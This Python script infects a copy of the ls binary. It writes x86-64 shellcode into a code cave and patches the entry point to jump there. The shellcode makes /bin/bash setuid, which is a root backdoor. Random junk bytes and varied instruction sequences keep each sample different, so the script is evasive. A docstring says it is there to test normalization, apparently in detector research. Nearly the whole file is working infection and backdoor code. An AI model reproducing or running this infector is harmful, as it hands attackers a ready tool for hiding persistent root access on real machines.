import struct
import os
import random
import hashlib


TARGET_LS = "./ls_infected"
ENTRY_POINT = 0x6d30 
CAVE_OFFSET = 0x14f00 

def get_md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def get_random_junk():
    junk_size = random.randint(8, 24)
    junk_bytes = bytes([random.randint(0, 255) for _ in range(junk_size)])
    # \xeb: short JMP
    return b"\xeb" + struct.pack("B", junk_size) + junk_bytes

def get_mutated_clear():
    """Varies the register clearing method to test Normalization."""
    return random.choice([
        b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6", # XOR RAX, RAX
        b"\x48\x29\xc0\x48\x29\xff\x48\x29\xf6", # SUB RAX, RAX
        b"\x6a\x00\x58\x6a\x00\x5f\x6a\x00\x5e"  # PUSH 0; POP RAX
    ])

def generate_payload():
    
    payload = b"\xf3\x0f\x1e\xfa" 
    payload += b"\x50\x53\x51\x52\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55"

    
    for _ in range(random.randint(2, 4)):
        payload += get_random_junk()

    # bin/bash suid
    payload += b"\x48\x31\xc0\x50" # Clear RAX, Push 0
    payload += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50" # "/bin/bas"
    payload += b"\x66\xc7\x44\x24\x08\x68\x00" # "h"
    payload += b"\x48\x89\xe7\x48\xc7\xc6\xed\x09\x00\x00" # chmod args
    payload += b"\x48\xc7\xc0\x5a\x00\x00\x00\x0f\x05" # syscall 90 (chmod)
    payload += b"\x48\x83\xc4\x10" # Fix stack

    
    payload += get_random_junk()
    payload += get_mutated_clear()
    
    
    payload += b"\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5a\x59\x5b\x58"
    payload += b"\x31\xed" # Clear RBP
    

    curr_pc = CAVE_OFFSET + len(payload)
    rel_ret = (ENTRY_POINT + 6) - (curr_pc + 5)
    payload += b"\xe9" + struct.pack("<i", rel_ret)
    
    return payload

def infect():
    
    
   
    if os.path.exists(TARGET_LS):
        os.remove(TARGET_LS)
    os.system(f"cp /bin/ls {TARGET_LS} && chmod +x {TARGET_LS}")
    
    with open(TARGET_LS, "r+b") as f:
        payload = generate_payload()
        f.seek(CAVE_OFFSET)
        f.write(payload)
        f.seek(ENTRY_POINT)
        rel_jmp = CAVE_OFFSET - (ENTRY_POINT + 5)
        f.write(b"\xe9" + struct.pack("<i", rel_jmp) + b"\x90")

    print(f"[+] Infected: {TARGET_LS}")
    print(f"[*] Payload Size:    {len(payload)} bytes")
    print(f"[*] MD5 Signature:   {get_md5(TARGET_LS)}")
 

if __name__ == "__main__":
    infect()
